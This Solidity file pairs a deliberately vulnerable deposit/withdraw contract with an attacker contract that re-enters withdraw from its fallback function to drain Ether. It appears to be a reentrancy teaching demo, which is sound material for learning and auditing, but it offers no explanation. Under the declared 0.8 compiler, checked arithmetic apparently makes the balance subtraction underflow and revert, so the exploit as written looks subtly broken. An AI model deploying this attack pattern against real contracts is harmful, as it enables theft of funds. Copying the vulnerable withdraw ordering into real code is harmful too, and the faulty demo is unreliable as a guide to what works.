// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableSingleFunction {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 _amount) external {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        balances[msg.sender] -= _amount;
    }
}

contract AttackerSingleFunction {
    VulnerableSingleFunction public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableSingleFunction(_vulnerableContract);
    }

    // Fallback function is called when Ether is sent to this contract
    fallback() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        vulnerableContract.deposit{value: 1 ether}();
        vulnerableContract.withdraw(1 ether);
    }
}
